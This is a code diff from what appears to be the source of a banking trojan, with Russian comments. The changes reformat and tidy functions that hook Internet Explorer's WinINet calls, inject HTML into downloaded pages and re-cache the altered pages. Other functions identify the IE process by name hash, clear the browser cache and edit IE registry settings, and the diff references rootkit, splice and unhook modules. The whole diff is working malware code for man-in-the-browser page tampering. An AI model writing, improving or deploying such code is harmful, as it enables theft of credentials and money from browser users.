@@ -2,18 +2,17 @@
 #include <wininet.h>
 #include <urlmon.h>
 
+#include "BotCore.h"
 #include "InternetExplorer.h"
 #include "HTMLInjectsScriptAdapter.h"
-#include "GetApi.h"
-#include "Utils.h"
-//#include "DllLoader.h"
-#include "Memory.h"
-#include "Strings.h"
-//#include "Exploit.h"
+//#include "GetApi.h"
+//#include "Utils.h"
+//#include "Memory.h"
+//#include "Strings.h"
 #include "BotUtils.h"
 #include "Rootkit.h"
 #include "Inject.h"
-#include "Crypt.h"
+//#include "Crypt.h"
 #include "Unhook.h"
 #include "Splice.h"
 #include "Loader.h"
@@ -641,8 +640,8 @@ void SetCallbackMethod(PRequest Request, INTERNET_STATUS_CALLBACK Method) {
 		INTERNET_OPTION_CONTEXT_VALUE, &Request->OldContext, &Size);
 
 	// Устанавливаем свои данные
-	Request->OldCallback = pInternetSetStatusCallback
-		((HINTERNET)Request->Owner, Method);
+	Request->OldCallback = pInternetSetStatusCallback((HINTERNET)Request->Owner, Method);
+
 	pInternetSetOptionA((HINTERNET)Request->Owner,
 		INTERNET_OPTION_CONTEXT_VALUE, &Request, sizeof(DWORD_PTR));
 
@@ -669,7 +668,8 @@ void WaitCallbackEvent(PRequest Request)
 	// Метод организовывает цикл обработки сообщений дл возникновения
 	// События Event
 	MSG Msg;
-	do {
+	do
+	{
 		while (pPeekMessageW(&Msg, NULL, 0, 0, PM_REMOVE))
 			pDispatchMessageW(&Msg);
 
@@ -681,7 +681,8 @@ void WaitCallbackEvent(PRequest Request)
 }
 // -----------------------------------------------------------------------------
 
-void AddPageToCashe(PRequest Request) {
+void AddPageToCashe(PRequest Request)
+{
 	// В случае изменения                                                                                                                          нных и включенном кешировании в настройках
 	// обозревателя кешируем загруженные данные
 
@@ -690,10 +691,11 @@ void AddPageToCashe(PRequest Request) {
 		return;
 
 	DWORD CacheSize = 4096;
-	INTERNET_CACHE_ENTRY_INFOA *Info = (INTERNET_CACHE_ENTRY_INFOA*)MemAlloc
-		(CacheSize);
+	INTERNET_CACHE_ENTRY_INFOA *Info = (INTERNET_CACHE_ENTRY_INFOA*)MemAlloc(CacheSize);
 
-	if (Info) {
+
+	if (Info)
+	{
 		Info->dwStructSize = sizeof(INTERNET_CACHE_ENTRY_INFOA);
 
 		if ((BOOL)pGetUrlCacheEntryInfoA(Request->URL, Info, &CacheSize)
@@ -741,10 +743,13 @@ MemFree( picei );
 
 DWORD WINAPI ReadDataProc(PRequest Request)
 {
+	if (!Request) return 0;
+
 	DWORD dwLastError = ERROR_SUCCESS;
 	int r = 1;
 
-	if (Request->Entry == 0 || Request->Entry == MAXDWORD) {
+	if (Request->Entry == 0 || Request->Entry == MAXDWORD)
+	{
 		// Загрузка проводится во временный буфер, инициализируем его
 		IEDBG(Request, NULL, "Загружаем документ");
 
@@ -758,8 +763,8 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 	Request::InitializeReceiveData(Request);
 
 	PMemBlockList List = Request->ReceiveList;
-	if (List == NULL)
-		return 0;
+	if (List == NULL) return 0;
+
 
 	INTERNET_BUFFERSA IB;
 	ClearStruct(IB);
@@ -768,13 +773,17 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 	IB.lpvBuffer = (LPBYTE)Request->ReceiveBuf->Data;
 
 	// Запускаем цикл загрузки
-	for (; ; ) {
+	for (; ; )
+	{
 		IB.dwBufferLength = Request->ReceiveBuf->Size;
 
 		if (!REAL_InternetReadFileExA((HINTERNET)Request->Owner, &IB,
-				IRF_NO_WAIT, (DWORD_PTR)Request)) {
-			if ((dwLastError = (DWORD)pGetLastError()) == ERROR_IO_PENDING) {
-				if (Request->Entry != MAXDWORD) {
+				IRF_NO_WAIT, (DWORD_PTR)Request))
+		{
+			if ((dwLastError = (DWORD)pGetLastError()) == ERROR_IO_PENDING)
+			{
+				if (Request->Entry != MAXDWORD)
+				{
 					Request->Entry++;
 					return 0;
 				}
@@ -791,8 +800,8 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 		dwLastError = ERROR_SUCCESS;
 
 		// Если Все данные загружены то прерываем цикл
-		if (IB.dwBufferLength == 0)
-			break;
+		if (IB.dwBufferLength == 0) break;
+
 
 		MEMBLOCK::AddBlock(List, IB.lpvBuffer, IB.dwBufferLength);
 	}
@@ -809,8 +818,10 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 
 #ifdef HTMLInjectsH
 	// Обрабатываем загруженные данные
-	if (r && !Request->Injected) {
-		if (DoInjectIE(Request)) {
+	if (r && !Request->Injected)
+	{
+		if (DoInjectIE(Request))
+		{
 			Request->DocumentNeedCached = true;
 			AddPageToCashe(Request);
 		}
@@ -821,7 +832,8 @@ DWORD WINAPI ReadDataProc(PRequest Request)
 	Request->FileReaded = true;
 
 	// Вызываем старый метод обратной связи
-	if (Request->Entry > 0 && Request->Entry != MAXDWORD) {
+	if (Request->Entry > 0 && Request->Entry != MAXDWORD)
+	{
 		INTERNET_ASYNC_RESULT iar;
 
 		iar.dwError = dwLastError;
@@ -841,12 +853,15 @@ int InjectReadFile(PRequest Request, LPVOID lpBuffer,
 	DWORD_PTR dwContext)
 {
 	// Функция загрузки файла
+	if (!Request) return 1;
+
 	int r = 1;
 
 	*lpdwNumberOfBytesRead = 0;
 
 	// Если страница ещё не загружена то запускаем её загрузку
-	if (!Request->FileReaded) {
+	if (!Request->FileReaded)
+	{
 		if (lpBuffer == NULL)
 			Request->Entry = MAXDWORD;
 
@@ -855,13 +870,15 @@ int InjectReadFile(PRequest Request, LPVOID lpBuffer,
 	}
 
 	// Если страница загружена то выдаём данные порциями, по мере запроса
-	if (Request->FileReaded && r && Request->Injected) {
+	if (Request->FileReaded && r && Request->Injected)
+	{
 		*lpdwNumberOfBytesRead = Request::GetNextDataPart(Request, lpBuffer,
 			dwNumberOfBytesToRead, true);
 	}
 
 	return r;
 }
+//-----------------------------------------------------------------------------
 
 void HandleFirstRead(PRequest Request)
 {
@@ -902,10 +919,12 @@ void HandleFirstRead(PRequest Request)
 	STR::Free(ContentType);
 #endif
 }
+//-----------------------------------------------------------------------------
 
 BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer,
 	DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead, DWORD dwFlags,
-	DWORD_PTR dwContext) {
+	DWORD_PTR dwContext)
+{
 	// Функция обработки методов для работы с методами чтения данных
 	int r = 0;
 
@@ -961,16 +980,19 @@ BOOL __stdcall InternetHandler(BYTE bType, HINTERNET hFile, LPVOID lpBuffer,
 	// Вызываем стандартные методы работы с интернетом
 	if (bType == 0)
 		r = REAL_InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead,
-		lpdwNumberOfBytesRead);
-	else if (bType == 1)
+			lpdwNumberOfBytesRead);
+	else
+	if (bType == 1)
 		r = REAL_InternetReadFileExA(hFile, (LPINTERNET_BUFFERSA)lpBuffer,
-		dwFlags, dwContext);
-	else if (bType == 2)
+			dwFlags, dwContext);
+	else
+	if (bType == 2)
 		r = REAL_InternetReadFileExW(hFile, (LPINTERNET_BUFFERSW)lpBuffer,
-		dwFlags, dwContext);
-	else if (bType == 3)
+			dwFlags, dwContext);
+	else
+	if (bType == 3)
 		r = REAL_InternetQueryDataAvailable(hFile, lpdwNumberOfBytesRead,
-		dwFlags, dwContext);
+			dwFlags, dwContext);
 
 	return r;
 }
@@ -994,7 +1016,8 @@ BOOL __stdcall HOOK_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpcwHeaders,
 
 BOOL __stdcall HOOK_HttpSendRequestExA(HINTERNET hRequest,
 	LPINTERNET_BUFFERSA lpBuffersIn, LPINTERNET_BUFFERSA lpBuffersOut,
-	DWORD dwFlags, DWORD_PTR dwContext) {
+	DWORD dwFlags, DWORD_PTR dwContext)
+{
 
 	return HttpSendRequestExHandler(TRUE, hRequest, lpBuffersIn, lpBuffersOut,
 		dwFlags, dwContext);
@@ -1007,7 +1030,7 @@ BOOL __stdcall HOOK_HttpSendRequestExW(HINTERNET hRequest,
 	DWORD dwFlags, DWORD_PTR dwContext)
 {
 	return HttpSendRequestExHandler(FALSE, hRequest, (LPINTERNET_BUFFERSA)
-		lpBuffersIn, (LPINTERNET_BUFFERSA)lpBuffersOut, dwFlags, dwContext);
+				lpBuffersIn, (LPINTERNET_BUFFERSA)lpBuffersOut, dwFlags, dwContext);
 
 }
 // -----------------------------------------------------------------------------
@@ -1021,13 +1044,15 @@ BOOL __stdcall HOOK_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer,
 // ----------------------------------------------------------------------------
 
 BOOL __stdcall HOOK_InternetReadFileExA(HINTERNET hFile,
-	LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext) {
+	LPINTERNET_BUFFERSA lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
+{
 	return InternetHandler(1, hFile, lpBuffersOut, 0, 0, dwFlags, dwContext);
 }
 // ----------------------------------------------------------------------------
 
 BOOL __stdcall HOOK_InternetReadFileExW(HINTERNET hFile,
-	LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext) {
+	LPINTERNET_BUFFERSW lpBuffersOut, DWORD dwFlags, DWORD_PTR dwContext)
+{
 	return InternetHandler(2, hFile, lpBuffersOut, 0, 0, dwFlags, dwContext);
 }
 // ----------------------------------------------------------------------------
@@ -1040,11 +1065,12 @@ BOOL __stdcall HOOK_InternetQueryDataAvailable(HINTERNET hFile,
 }
 // ----------------------------------------------------------------------------
 
-BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet) {
+BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet)
+{
 	// Браузер закрывает дескриптор
 	// Удаляем струру запроса
 	PRequest R = Request::Find(Requests, hInternet);
-	if (R != NULL)
+	if (R)
 	{
 
 		if (R->AllowClose != NULL)
@@ -1053,7 +1079,7 @@ BOOL WINAPI HOOK_InternetCloseHandle(HINTERNET hInternet) {
         }
 
 		PRequest R = Request::Find(Requests, hInternet);
-		if (R != NULL)
+		if (R)
 		{
 			IEDBG(R, NULL, "Соединение закрыто");
 			Request::Delete(Requests, hInternet);
@@ -1081,7 +1107,8 @@ void ProcessInternetConnection(HINTERNET Handle, LPBYTE InetServer, bool IsSecur
 
 	// Собираем адрес запроса
 
-	PCHAR Server = (IsUnicode)? (WSTR::ToAnsi((PWCHAR)InetServer, 0)) : ((PCHAR)InetServer);
+	PCHAR Server = (IsUnicode)? (WSTR::ToAnsi((PWCHAR)InetServer, 0)) :
+								((PCHAR)InetServer);
 
 	PCHAR Protocol = (IsSecure)? ProtocolHTTPS : ProtocolHTTP;
 
@@ -1100,16 +1127,14 @@ HINTERNET WINAPI HOOK_InternetConnectA(HINTERNET hInternet,
 {
 	// Создаём подключение
 	HINTERNET Handle = REAL_InternetConnectA(hInternet, lpszServerName,
-						nServerPort, lpszUserName, lpszPassword, dwService,
-						dwFlags, dwContext);
+							nServerPort, lpszUserName, lpszPassword, dwService,
+							dwFlags, dwContext);
 
 	if (dwService == INTERNET_SERVICE_HTTP)
 	{
 		bool IsSecure = (dwFlags & INTERNET_FLAG_SECURE) != 0;
 		ProcessInternetConnection(Handle, (LPBYTE)lpszServerName, IsSecure, false);
 	}
-
-
 	return Handle;
 }
 
@@ -1128,8 +1153,6 @@ HINTERNET WINAPI HOOK_InternetConnectW(HINTERNET hInternet,
 		bool IsSecure = (dwFlags & INTERNET_FLAG_SECURE) != 0;
 		ProcessInternetConnection(Handle, (LPBYTE)lpszServerName, IsSecure, true);
 	}
-
-
 	return Handle;
 }
 //-----------------------------------------------------------------------------
@@ -1139,8 +1162,8 @@ HINTERNET WINAPI HOOK_InternetConnectW(HINTERNET hInternet,
 	{
 		// Функция обрабатывает запрос
 		PRequest R = Request::Find(Requests, Connect);
-		if (R == NULL)
-			return;
+		if (R == NULL) return;
+
 
 		PCHAR URL =  STR::New(2, R->URL, Object);
 
@@ -1272,23 +1295,14 @@ bool WINAPI IsInternetExplorer()
 	// Функция вернёт истину если она вызвана в процессе
 	// интернет експлорера
 
-	WCHAR *ModulePath = (WCHAR*)MemAlloc(MAX_PATH);
+	DWORD Hash = File::GetNameHashA(Bot->ApplicationName(), true);
 
-	if (ModulePath == NULL) {
-		return false;
-	}
+	bool IsIE = Hash == 0x250DFA8F /* iexplore.exe */ ||
+				Hash == 0x1D30C46B /* хер его знает */;
 
-	pGetModuleFileNameW(NULL, ModulePath, MAX_PATH);
-	DWORD dwProcessHash = GetNameHash(ModulePath);
-
-	MemFree(ModulePath);
-	if (dwProcessHash == 0x250DFA8F || dwProcessHash == 0x1D30C46B /* ||
-		dwProcessHash == 0x490A0972*/) {
-		return true;
-	}
-
-	return false;
+	return IsIE;
 }
+// ----------------------------------------------------------------------------
 
 void IEClearCache()
 {
@@ -1385,6 +1399,7 @@ void IEClearCache()
 
 	return;
 }
+// ----------------------------------------------------------------------------
 
 // *********************************************************************
 // UpdateIERegistry - Правит настройки реестра, для отключения
@@ -1438,9 +1453,11 @@ void UpdateIERegistry()
 		STR::Free(Path);
 	}
 }
+// ----------------------------------------------------------------------------
 
 
-bool HookInternetExplorer() {
+bool HookInternetExplorer()
+{
 	// функция вешает хуки на базовые функции которые использует
 	// Internet Explorer для загрузки документов
 	// Работает только в случае вызова из процесса интернет експлорера
@@ -1476,10 +1493,11 @@ bool HookInternetExplorer() {
 	IEDBG("Интернет эксплорер проинициализирован");
 	return true;
 }
+// ----------------------------------------------------------------------------
 
 
-
-bool HookInternetExplorerApi() {
+bool HookInternetExplorerApi()
+{
 	// HookInternetExplorerApi - функция вешает хуки на интернет API
 	// которые использует интернет експлорер для загрузки страниц
 
